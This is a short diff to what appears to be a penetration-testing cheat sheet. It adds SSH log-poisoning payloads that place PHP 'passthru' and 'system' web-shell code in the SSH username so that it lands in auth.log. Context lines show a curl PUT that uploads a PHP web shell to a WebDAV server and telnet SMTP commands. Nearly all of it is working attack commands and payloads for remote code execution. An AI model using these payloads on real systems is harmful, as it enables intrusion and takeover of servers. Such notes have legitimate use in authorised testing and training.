@@ -307,6 +307,9 @@ xmlns:urn=\"urn:muddy\"><soapenv:Header/>
 > 1. Webdav password location probably ```bash var/www/html/webdav/passwd.dav```
 > 1. Uploading PHP rce on WebDav via CURL ```curl -X PUT -u administrantor:password http://abc.com/webdav/myrce.php --data-binary @"/usr/share/webshells/php/codeexec.php"``` 
 	
+#### Log poision via SSH auth.log
+> 1. ssh '<?php passthru($_GET['cmd']);?>'@192.168.10.106
+> 1. ssh '<?php system($_GET['cmd']);?>'@192.168.10.106
 #### Sending email via TELNET
 > 1. ```bash telnet  192.168.227.157 25```
 > 1. ```bash helo skinny```
